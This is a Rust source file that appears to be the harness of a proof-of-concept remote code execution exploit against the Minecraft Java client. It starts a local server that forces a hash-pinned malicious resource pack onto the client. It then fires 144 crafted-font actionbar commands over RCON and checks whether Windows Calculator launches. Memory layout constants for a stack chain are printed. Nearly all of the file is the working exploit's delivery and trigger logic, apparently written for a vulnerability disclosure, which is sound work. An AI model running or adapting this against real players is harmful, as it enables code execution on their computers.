mod bootstrap;
mod icon;
mod rcon;
mod windows_util;

use anyhow::{bail, Result};
use std::collections::HashSet;
use std::io::{Read, Write as _};
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::time::{Duration, Instant};
use uuid::Uuid;

const PLAYER: &str = "1337";
const SERVER_PORT: u16 = 25565;
const HTTP_PORT: u16 = 8766;
const RCON_PORT: u16 = 25575;
const QUIET_SECONDS: u64 = 15;
const PACK_SHA1: &str = "F2E2859318152E32FC331D2291C2EC40FFB3C372";

fn require_free_ports() -> Result<()> {
    for port in [SERVER_PORT, HTTP_PORT, RCON_PORT] {
        if std::net::TcpStream::connect(format!("127.0.0.1:{port}")).is_ok() {
            bail!("Local port {port} is already in use");
        }
    }
    Ok(())
}

fn write_server_files(server_dir: &Path, rcon_password: &str) -> Result<()> {
    std::fs::write(server_dir.join("eula.txt"), "eula=true\n")?;
    let pack_uuid = Uuid::new_v4();
    let content = format!(
        "server-ip=127.0.0.1\n\
         server-port={SERVER_PORT}\n\
         online-mode=false\n\
         enforce-secure-profile=false\n\
         white-list=false\n\
         enforce-whitelist=false\n\
         enable-status=true\n\
         max-players=4\n\
         view-distance=2\n\
         simulation-distance=2\n\
         difficulty=peaceful\n\
         spawn-monsters=false\n\
         pause-when-empty-seconds=0\n\
         sync-chunk-writes=false\n\
         level-type=minecraft:flat\n\
         level-name=world-proof\n\
         accepts-transfers=true\n\
         enable-rcon=true\n\
         rcon.port={RCON_PORT}\n\
         rcon.password={rcon_password}\n\
         broadcast-rcon-to-ops=false\n\
         resource-pack=http://127.0.0.1:{HTTP_PORT}/resource-pack.zip\n\
         resource-pack-sha1={PACK_SHA1}\n\
         resource-pack-id={pack_uuid}\n\
         require-resource-pack=true\n"
    );
    std::fs::write(server_dir.join("server.properties"), content)?;
    icon::write_server_icon(&server_dir.join("server-icon.png"))?;
    Ok(())
}

fn text_contains(path: &Path, needle: &str) -> bool {
    std::fs::read_to_string(path)
        .map(|s| s.contains(needle))
        .unwrap_or(false)
}

fn wait_for<F: Fn() -> bool>(label: &str, predicate: F, timeout: Duration) -> Result<()> {
    let deadline = Instant::now() + timeout;
    while Instant::now() < deadline {
        if predicate() {
            return Ok(());
        }
        std::thread::sleep(Duration::from_millis(250));
    }
    bail!("Timed out waiting for {label}")
}

fn start_pack_server(pack_path: PathBuf, served: Arc<AtomicBool>) {
    std::thread::spawn(move || {
        let listener = TcpListener::bind(format!("127.0.0.1:{HTTP_PORT}"))
            .expect("bind HTTP port");
        for stream in listener.incoming() {
            let mut stream = match stream {
                Ok(s) => s,
                Err(_) => continue,
            };
            let mut buf = [0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let req = String::from_utf8_lossy(&buf[..n]);
            if req.contains("GET /resource-pack.zip") {
                let data = std::fs::read(&pack_path).expect("read pack");
                let _ = stream.write_all(
                    format!(
                        "HTTP/1.1 200 OK\r\n\
                         Content-Type: application/zip\r\n\
                         Content-Length: {}\r\n\
                         Connection: close\r\n\r\n",
                        data.len()
                    )
                    .as_bytes(),
                );
                let _ = stream.write_all(&data);
                served.store(true, Ordering::SeqCst);
                println!("PACK_SERVED resource-pack.zip");
            } else {
                let _ = stream.write_all(
                    b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
                );
            }
        }
    });
}

fn monitor_calculator(baseline: &HashSet<u32>, observed: &mut HashSet<u32>) -> bool {
    if let Ok(current) = windows_util::calculator_processes() {
        for pid in current.difference(baseline) {
            if observed.insert(*pid) {
                println!("CALCULATOR_PROCESS PID={pid}");
            }
        }
    }
    !observed.is_empty()
}

fn wait_for_calculator(baseline: &HashSet<u32>, observed: &mut HashSet<u32>, secs: u64) -> bool {
    let deadline = Instant::now() + Duration::from_secs(secs);
    while Instant::now() < deadline {
        if monitor_calculator(baseline, observed) {
            return true;
        }
        std::thread::sleep(Duration::from_millis(250));
    }
    monitor_calculator(baseline, observed)
}

fn run_phase(
    phase: char,
    rcon_password: &str,
    baseline: &HashSet<u32>,
    observed: &mut HashSet<u32>,
    log_path: &Path,
) -> Result<()> {
    let cp = phase as u32;
    println!("PHASE_{phase} BEGIN 144 fonts glyph=U+{cp:04X} ({cp})");
    let delay = if phase == 'F' {
        Duration::from_millis(650)
    } else {
        Duration::from_millis(1200)
    };
    let mut rcon = rcon::Rcon::connect(&format!("127.0.0.1:{RCON_PORT}"), rcon_password)?;
    let mut log = std::fs::File::create(log_path)?;
    for face in 0usize..144 {
        let font_name = format!("deferred-{face:03}");
        let body = serde_json::json!({
            "text": phase.to_string(),
            "font": format!("ctf:{font_name}")
        })
        .to_string();
        let request_id = (face + 2) as i32;
        let (resp_id, resp) =
            rcon.command(request_id, &format!("title {PLAYER} actionbar {body}"))?;
        if resp_id != request_id || !resp.contains("Showing new actionbar") {
            bail!("Phase {phase} font {font_name}: {resp}");
        }
        let msg = format!("{phase} {:03}/144 font={font_name} accepted", face + 1);
        println!("{msg}");
        writeln!(log, "{msg}")?;
        log.flush()?;
        monitor_calculator(baseline, observed);
        if phase == 'A' && !observed.is_empty() {
            return Ok(());
        }
        std::thread::sleep(delay);
        monitor_calculator(baseline, observed);
        if phase == 'A' && !observed.is_empty() {
            return Ok(());
        }
    }
    println!("PHASE_{phase} COMPLETE 144/144");
    Ok(())
}

fn stop_child(child: &mut Option<Child>) {
    if let Some(c) = child.as_mut() {
        if c.try_wait().map_or(true, |s| s.is_none()) {
            let _ = c.kill();
        }
        let _ = c.wait();
    }
    *child = None;
}

fn locate_root() -> PathBuf {
    let exe = std::env::current_exe().unwrap_or_default();
    let mut candidate = exe.parent().map(Path::to_path_buf);
    while let Some(dir) = candidate {
        if dir.join("resource-pack.zip").exists() {
            return dir;
        }
        candidate = dir.parent().map(Path::to_path_buf);
    }
    std::env::current_dir().unwrap_or_default()
}

fn main() {
    if let Err(e) = run() {
        eprintln!("POC_FAILURE {e}");
        std::process::exit(1);
    }
}

#[allow(unreachable_code)]
fn run() -> Result<()> {
    #[cfg(not(target_os = "windows"))]
    { bail!("This proof requires Windows x64"); }

    let root = locate_root();
    let pack = root.join("resource-pack.zip");
    if !pack.exists() {
        bail!("resource-pack.zip not found (looked in {})", root.display());
    }
    let pack_sha1 = bootstrap::sha1_hex_file(&pack)?;
    if !pack_sha1.eq_ignore_ascii_case(PACK_SHA1) {
        bail!("resource-pack.zip does not match the validated SHA1");
    }

    println!("PACK_LAYOUT points=104 vector_bytes=832 (0x340) sweep=128 (0x80)");
    println!("VM_LAYOUT stack_cells=12288 stack_bytes=49152 (0xC000) chain_offset=28672 (0x7000)");

    require_free_ports()?;

    let manifest = bootstrap::prepare_dependencies(&root)?;
    if manifest.server_launch_mode != "jar" {
        bail!("This PoC requires an official server JAR");
    }

    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| d.as_secs());
    let run_id = format!("{ts:016x}-{}", &Uuid::new_v4().simple().to_string()[..8]);
    let run_dir = root.join("runs").join(&run_id);
    let server_dir = run_dir.join("server");
    let client_dir = run_dir.join("client-game");
    std::fs::create_dir_all(&server_dir)?;
    std::fs::create_dir_all(&client_dir)?;

    std::fs::copy(&manifest.options_file, client_dir.join("options.txt"))?;
    std::fs::copy(&manifest.trusted_servers_dat, client_dir.join("servers.dat"))?;

    let rcon_password = Uuid::new_v4().simple().to_string();
    write_server_files(&server_dir, &rcon_password)?;

    let baseline = windows_util::calculator_processes().unwrap_or_default();
    let mut observed: HashSet<u32> = HashSet::new();
    let served = Arc::new(AtomicBool::new(false));

    start_pack_server(pack.clone(), Arc::clone(&served));

    let java = manifest.java_path.to_string_lossy().into_owned();
    let classpath = std::fs::read_to_string(&manifest.classpath_file)?;
    let logging_path = std::fs::read_to_string(&manifest.logging_path_file)?.trim().to_string();
    let natives = manifest.natives_dir.to_string_lossy().into_owned();
    let assets_dir = manifest.assets_dir.to_string_lossy().into_owned();
    let asset_index = &manifest.asset_index;

    let server_stdout = std::fs::File::create(run_dir.join("server.stdout.log"))?;
    let server_stderr = std::fs::File::create(run_dir.join("server.stderr.log"))?;
    let mut game_server: Option<Child> = Some(
        Command::new(&java)
            .args(["-Xms256M", "-Xmx1G", "-jar"])
            .arg(&manifest.server_runtime_jar)
            .arg("nogui")
            .current_dir(&server_dir)
            .stdout(Stdio::from(server_stdout))
            .stderr(Stdio::from(server_stderr))
            .spawn()?,
    );

    let server_log = run_dir.join("server.stdout.log");
    wait_for("server startup", || text_contains(&server_log, "Done ("), Duration::from_secs(180))?;

    let client_stdout = std::fs::File::create(run_dir.join("client.stdout.log"))?;
    let client_stderr = std::fs::File::create(run_dir.join("client.stderr.log"))?;
    let heap_dump = run_dir.join("java_heapdump.hprof");
    let hs_err = run_dir.join("hs_err.log");

    let mut client_cmd = Command::new(&java);
    client_cmd
        .args(["-Xms2G", "-Xmx4G",
               "-XX:+UseCompactObjectHeaders", "-XX:+AlwaysPreTouch",
               "-XX:+UseStringDeduplication", "-XX:+UseZGC",
               "-XX:StackShadowPages=32"])
        .arg(format!("-XX:HeapDumpPath={}", heap_dump.display()))
        .arg(format!("-XX:ErrorFile={}", hs_err.display()))
        .arg("--enable-native-access=ALL-UNNAMED")
        .args(["--add-exports", "java.base/jdk.internal.misc=ALL-UNNAMED"])
        .arg(format!("-Djava.library.path={natives}"))
        .arg(format!("-Djna.tmpdir={natives}"))
        .arg(format!("-Dorg.lwjgl.system.SharedLibraryExtractPath={natives}"))
        .arg(format!("-Dio.netty.native.workdir={natives}"))
        .arg("-Dminecraft.launcher.brand=local-proof")
        .arg("-Dminecraft.launcher.version=1")
        .arg(format!("-Dlog4j.configurationFile={logging_path}"))
        .arg("-cp").arg(&classpath)
        .arg("net.minecraft.client.main.Main")
        .args(["--username", PLAYER, "--version", "26.3"])
        .args(["--gameDir", &client_dir.to_string_lossy()])
        .args(["--assetsDir", &assets_dir])
        .args(["--assetIndex", asset_index])
        .args(["--uuid", "00000000000000000000000000000001",
               "--accessToken", "0", "--clientId", "0", "--xuid", "0"])
        .args(["--versionType", "release", "--width", "960", "--height", "540"])
        .args(["--quickPlayMultiplayer", &format!("127.0.0.1:{SERVER_PORT}")])
        .current_dir(&client_dir)
        .stdout(Stdio::from(client_stdout))
        .stderr(Stdio::from(client_stderr));

    let mut game_client: Option<Child> = Some(client_cmd.spawn()?);
    println!("STOCK_CLIENT_STARTED PID={}", game_client.as_ref().unwrap().id());

    let served_ref = Arc::clone(&served);
    let server_log2 = server_log.clone();
    wait_for(
        "client join and pack fetch",
        || {
            served_ref.load(Ordering::SeqCst)
                && text_contains(&server_log2, &format!("{PLAYER} joined the game"))
        },
        Duration::from_secs(240),
    )?;

    let client_log = client_dir.join("logs/latest.log");
    wait_for(
        "client resource-pack reload",
        || {
            if !client_log.exists() {
                return false;
            }
            std::fs::read_to_string(&client_log).map_or(false, |s| {
                s.lines()
                    .any(|l| l.contains("Reloading ResourceManager") && l.contains("server/"))
            })
        },
        Duration::from_secs(90),
    )?;
    println!("STOCK_CLIENT_PACK_READY");

    let mut success = false;
    let mut result_pids: Vec<u32> = Vec::new();
    let mut window_visible = false;

    println!("QUIET_BEFORE_F={QUIET_SECONDS} seconds");
    std::thread::sleep(Duration::from_secs(QUIET_SECONDS));
    let phase_result = run_phase('F', &rcon_password, &baseline, &mut observed, &run_dir.join("phase-F.log"));

    let phase_result = phase_result.and_then(|()| {
        println!("QUIET_BEFORE_A={QUIET_SECONDS} seconds");
        std::thread::sleep(Duration::from_secs(QUIET_SECONDS));
        run_phase('A', &rcon_password, &baseline, &mut observed, &run_dir.join("phase-A.log"))
    });

    let phase_ok = match phase_result {
        Ok(()) => true,
        Err(ref e) => {
            if wait_for_calculator(&baseline, &mut observed, 5) {
                println!("PHASE_A INTERRUPTED after Calculator launched");
                true
            } else {
                println!("POC_FAILURE {e}");
                false
            }
        }
    };

    if phase_ok && wait_for_calculator(&baseline, &mut observed, 5) {
        let deadline = Instant::now() + Duration::from_secs(10);
        let mut windows = Vec::new();
        while Instant::now() < deadline {
            windows = windows_util::visible_calculator_windows(&observed);
            if !windows.is_empty() {
                break;
            }
            std::thread::sleep(Duration::from_millis(250));
        }
        success = true;
        result_pids = observed.iter().copied().collect();
        result_pids.sort();
        window_visible = !windows.is_empty();
        println!(
            "POC_SUCCESS Calculator PID(s): {}",
            result_pids.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(", ")
        );
        println!("CALCULATOR_WINDOW_VISIBLE={window_visible}");
    }

    stop_child(&mut game_client);
    stop_child(&mut game_server);

    let result = serde_json::json!({
        "success": success,
        "calculator_pids": result_pids,
        "calculator_window_visible": window_visible,
        "pack_sha1": PACK_SHA1,
        "run_dir": run_dir.to_string_lossy()
    });
    let result_path = run_dir.join("result.json");
    std::fs::write(&result_path, serde_json::to_string_pretty(&result)? + "\n")?;
    println!("RESULT_FILE={}", result_path.display());
    println!("Calculator remains open for reviewer inspection when launched");

    if success { Ok(()) } else { bail!("PoC did not succeed") }
}
